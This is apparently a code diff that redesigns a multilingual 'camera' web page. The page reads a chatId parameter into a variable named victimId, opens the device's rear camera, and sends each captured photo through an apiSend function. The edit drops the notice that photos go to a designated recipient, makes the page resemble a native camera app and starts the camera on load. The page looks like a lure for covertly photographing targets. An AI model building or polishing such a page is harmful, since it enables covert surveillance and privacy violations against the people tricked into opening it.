@@ -1,72 +1,79 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title data-i18n="page_title">الكاميرا</title>
-
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Cairo', sans-serif;
-        }
-
         body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            margin: 0;
             background: #000;
+            font-family: sans-serif;
+            display: flex;
             flex-direction: column;
+            height: 100vh;
+        }
+        #viewfinder {
+            flex: 1;
+            background: #111;
             position: relative;
             overflow: hidden;
         }
-
-        /* ---------- ڤیدیۆی کامێرا وەک باکگراوند ---------- */
-        #viewfinder {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-        }
-
         video {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
-
         #overlay {
-            position: fixed;
-            top: 0;
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(180deg, rgba(0,0,0,.3), transparent 30%, transparent 70%, rgba(0,0,0,.5));
+        }
+        #status {
+            position: absolute;
+            top: 16px;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(6px);
-            z-index: 1;
+            right: 0;
+            text-align: center;
+            color: #fff;
+            font-size: 14px;
+            text-shadow: 0 1px 3px #000;
+            z-index: 5;
+        }
+        #controls {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: #1a1a1a;
+            gap: 24px;
+        }
+        #shutter {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            border: 4px solid #fff;
+            background: rgba(255,255,255,.15);
+            cursor: pointer;
+        }
+        #shutter:active {
+            background: #fff;
         }
 
-        /* ---------- هەڵبژاردەی زمان ---------- */
+        /* ===== هەڵبژاردەی زمان (زیادکراو) ===== */
         .lang-selector {
-            position: fixed;
+            position: absolute;
             top: 15px;
             right: 20px;
             z-index: 99;
-            background: #fff;
+            background: rgba(255,255,255,0.9);
             border-radius: 30px;
             padding: 5px 15px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
             display: flex;
             gap: 10px;
+            backdrop-filter: blur(10px);
         }
-
         .lang-btn {
             border: none;
             background: transparent;
@@ -75,119 +82,16 @@
             cursor: pointer;
             font-size: 14px;
             font-weight: 600;
-            color: #666;
+            color: #333;
             transition: 0.3s;
         }
-
         .lang-btn.active {
             background: #34c759;
             color: #fff;
         }
-
-        /* ---------- کاردی سەرەکی ---------- */
-        .card {
-            position: relative;
-            z-index: 2;
-            width: 390px;
-            max-width: 95%;
-            background: rgba(255, 255, 255, .92);
-            backdrop-filter: blur(15px);
-            border-radius: 28px;
-            padding: 35px 28px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, .35);
-            text-align: center;
-        }
-
-        .icon {
-            width: 90px;
-            height: 90px;
-            margin: auto;
-            margin-bottom: 20px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 42px;
-            color: #fff;
-            box-shadow: 0 10px 25px rgba(238, 90, 36, .45);
-        }
-
-        h1 {
-            color: #222;
-            font-size: 28px;
-            margin-bottom: 15px;
-        }
-
-        .desc {
-            font-size: 16px;
-            color: #555;
-            line-height: 1.9;
-            margin-bottom: 25px;
-        }
-
-        .info {
-            background: #f8f9fb;
-            border-radius: 18px;
-            padding: 18px;
-            text-align: right;
-            margin-bottom: 25px;
-        }
-
-        .info h2 {
-            font-size: 18px;
-            margin-bottom: 12px;
-            color: #222;
-        }
-
-        .info p {
-            color: #555;
-            line-height: 1.8;
-            font-size: 15px;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 18px;
-            border: none;
-            border-radius: 50px;
-            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: .25s;
-        }
-
-        .btn:hover {
-            transform: scale(1.03);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .note {
-            margin-top: 20px;
-            font-size: 13px;
-            color: #777;
-        }
-
-        #result {
-            margin-top: 15px;
-            font-weight: bold;
-            color: #333;
-        }
     </style>
 </head>
 <body>
-
-    <!-- ========== ڤیدیۆی پشتەوە ========== -->
-    <div id="viewfinder">
-        <video id="video" autoplay playsinline muted></video>
-    </div>
-    <div id="overlay"></div>
 
     <!-- ========== هەڵبژاردەی زمان ========== -->
     <div class="lang-selector">
@@ -196,93 +100,55 @@
         <button class="lang-btn" onclick="changeLang('en')">English</button>
     </div>
 
-    <!-- ========== کاردی ناوەڕۆک ========== -->
-    <div class="card">
-        <div class="icon">📷</div>
-        <h1 data-i18n="main_title">التقط صورة</h1>
-        <p class="desc" data-i18n="desc">
-            يمكنك التقاط صورة مباشرةً وإرسالها.
-            اضغط على الزر أدناه لبدء التصوير.
-        </p>
-
-        <div class="info">
-            <h2 data-i18n="info_title">معلومات</h2>
-            <p data-i18n="info_text">
-                سيتم التقاط الصورة وإرسالها تلقائياً.
-            </p>
-        </div>
-
-        <button id="btnCapture" class="btn" data-i18n="start_btn">
-            📸 اضغط لالتقاط صورة
-        </button>
-
-        <div id="result"></div>
-
-        <p class="note" data-i18n="footer_note">
-            سيتم إرسال الصورة للجهة المحددة
-        </p>
+    <div id="viewfinder">
+        <video id="video" autoplay playsinline muted></video>
+        <div id="overlay"></div>
+        <div id="status" data-i18n="loading">جارٍ تجهيز الكاميرا...</div>
+    </div>
+    <div id="controls">
+        <span style="width:18px"></span>
+        <button id="shutter"></button>
+        <span style="width:18px"></span>
     </div>
 
     <script>
-        // ========== وەرگێڕان ==========
+        /* ===== داتابەیسی وەرگێڕان ===== */
         const translations = {
             ar: {
                 page_title: "الكاميرا",
-                main_title: "التقط صورة",
-                desc: "يمكنك التقاط صورة مباشرةً وإرسالها. اضغط على الزر أدناه لبدء التصوير.",
-                info_title: "معلومات",
-                info_text: "سيتم التقاط الصورة وإرسالها تلقائياً.",
-                start_btn: "📸 اضغط لالتقاط صورة",
-                footer_note: "سيتم إرسال الصورة للجهة المحددة",
-                loading: "⏳ جارٍ التجهيز...",
-                success: "✅ تم الإرسال بنجاح",
-                done: "✅ تم",
-                error_prefix: "❌ فشل: ",
-                retry: "📸 إعادة المحاولة",
+                loading: "جارٍ تجهيز الكاميرا...",
+                ready: "اضغط الزر لالتقاط صورة",
+                success: "✅ تم الإرسال",
+                fail: "❌ فشل الإرسال",
                 camera_error: "⚠️ تعذّر الوصول للكاميرا"
             },
             ckb: {
                 page_title: "کامێرا",
-                main_title: "وێنەیەک بگرە",
-                desc: "دەتوانیت ڕاستەوخۆ وێنەیەک بگریت و بینێریت. بۆ دەستپێکردن کرتە لەسەر دوگمەکەی خوارەوە بکە.",
-                info_title: "زانیاری",
-                info_text: "وێنەکە بە شێوەیەکی خۆکار دەگیرێت و دەنێردرێت.",
-                start_btn: "📸 بۆ گرتنی وێنە کرتە لێرە بکە",
-                footer_note: "وێنەکە بۆ لایەنی دیاریکراو دەنێردرێت",
-                loading: "⏳ چاوەڕوانی ئامادەکردن...",
-                success: "✅ بە سەرکەوتوویی نێردرا",
-                done: "✅ تەواو",
-                error_prefix: "❌ شکست: ",
-                retry: "📸 دووبارە هەوڵبدەرەوە",
-                camera_error: "⚠️ نەتوانرا کامێرا بکرێتەوە"
+                loading: "کامێرا ئامادە دەکرێت...",
+                ready: "دوگمەکە پەنجە بنێ بۆ وێنەگرتن",
+                success: "✅ نێردرا",
+                fail: "❌ ناردن سەرکەوتوو نەبوو",
+                camera_error: "⚠️ کامێرا نەتوانرا بکرێتەوە"
             },
             en: {
                 page_title: "Camera",
-                main_title: "Take a Picture",
-                desc: "You can capture a photo instantly and send it. Click the button below to start.",
-                info_title: "Information",
-                info_text: "The photo will be captured and sent automatically.",
-                start_btn: "📸 Click to take a picture",
-                footer_note: "The photo will be sent to the designated recipient",
-                loading: "⏳ Preparing...",
-                success: "✅ Sent successfully",
-                done: "✅ Done",
-                error_prefix: "❌ Failed: ",
-                retry: "📸 Retry",
+                loading: "Preparing camera...",
+                ready: "Press the button to take a photo",
+                success: "✅ Sent",
+                fail: "❌ Failed to send",
                 camera_error: "⚠️ Could not access camera"
             }
         };
 
-        let currentLang = localStorage.getItem('preferred_lang_cam') || 'ar';
-
         function changeLang(lang) {
-            currentLang = lang;
-            localStorage.setItem('preferred_lang_cam', lang);
+            // گۆڕینی ئاڕاستەی پەڕە (بۆ عەرەبی و کوردی RTL، ئینگلیزی LTR)
+            if (lang === 'ar' || lang === 'ckb') {
+                document.documentElement.dir = 'rtl';
+            } else {
+                document.documentElement.dir = 'ltr';
+            }
 
-            // ئاڕاستە
-            document.documentElement.dir = (lang === 'en') ? 'ltr' : 'rtl';
-
-            // نوێکردنەوەی ناونیشانەکان
+            // نوێکردنەوەی هەموو توخمەکانی data-i18n
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 const key = el.getAttribute('data-i18n');
                 if (translations[lang] && translations[lang][key]) {
@@ -290,28 +156,21 @@
                 }
             });
 
-            // دوگمەی چالاک
-            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+            // دیاریکردنی دوگمەی چالاک لە هەڵبژاردەکە
+            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
             document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
 
-            // نوێکردنەوەی دوگمەکە ئەگەر لە دۆخی چاوەڕوانی یان تەواوبوون بێت
-            const btn = document.getElementById('btnCapture');
-            if (btn.disabled) {
-                btn.textContent = translations[lang].loading;
-            } else if (btn.textContent.includes('✅')) {
-                btn.textContent = translations[lang].done;
-            } else if (btn.textContent.includes('📸')) {
-                btn.textContent = translations[lang].start_btn;
-            }
+            // پاشەکەوتکردنی زمان
+            localStorage.setItem('preferred_lang', lang);
         }
 
-        // بارکردنی زمان
+        // بارکردنی زمانی پاشەکەوتکراو لەگەڵ کرانەوەی پەڕە
         window.addEventListener('DOMContentLoaded', () => {
-            changeLang(currentLang);
-            startCamera();
+            const savedLang = localStorage.getItem('preferred_lang') || 'ar';
+            changeLang(savedLang);
         });
 
-        // ===== بلۆکی ناردن (وەک خۆی) =====
+        /* ===== کۆدی بنەڕەتی کامێرا (دەستکاری نەکراو) ===== */
         const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
 
         async function apiSend(payload) {
@@ -324,57 +183,44 @@
                 return r.ok;
             } catch (e) { return false; }
         }
-        // ==============================
 
         const video = document.getElementById('video');
-        const resultEl = document.getElementById('result');
+        const statusEl = document.getElementById('status');
         let stream = null;
 
         function sendPhoto(dataUrl) {
-            const btn = document.getElementById('btnCapture');
-            btn.disabled = true;
-            btn.textContent = translations[currentLang].loading;
-
             apiSend({ type: 'photo', chatId: victimId, photo: dataUrl, caption: '📸 صورة من الكاميرا' })
                 .then(ok => {
-                    resultEl.textContent = ok ? translations[currentLang].success : translations[currentLang].error_prefix + 'فشل';
-                    btn.textContent = translations[currentLang].done;
+                    const currentLang = localStorage.getItem('preferred_lang') || 'ar';
+                    statusEl.textContent = ok ? translations[currentLang].success : translations[currentLang].fail;
                     setTimeout(() => {
-                        btn.disabled = false;
-                        btn.textContent = translations[currentLang].start_btn;
-                        resultEl.textContent = '';
+                        statusEl.textContent = translations[currentLang].ready;
                     }, 2000);
                 });
         }
 
         async function startCamera() {
-            const btn = document.getElementById('btnCapture');
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment' },
-                    audio: false
-                });
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
                 video.srcObject = stream;
-                btn.textContent = translations[currentLang].start_btn;
-                btn.disabled = false;
+                const currentLang = localStorage.getItem('preferred_lang') || 'ar';
+                statusEl.textContent = translations[currentLang].ready;
             } catch (e) {
-                resultEl.textContent = translations[currentLang].camera_error;
-                btn.textContent = translations[currentLang].retry;
-                btn.disabled = false;
+                const currentLang = localStorage.getItem('preferred_lang') || 'ar';
+                statusEl.textContent = translations[currentLang].camera_error;
             }
         }
 
-        document.getElementById('btnCapture').addEventListener('click', () => {
-            if (!stream) {
-                resultEl.textContent = translations[currentLang].camera_error;
-                return;
-            }
+        document.getElementById('shutter').onclick = () => {
+            if (!stream) { startCamera(); return; }
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             sendPhoto(canvas.toDataURL('image/jpeg', 0.8));
-        });
+        };
+
+        startCamera();
     </script>
 </body>
 </html>
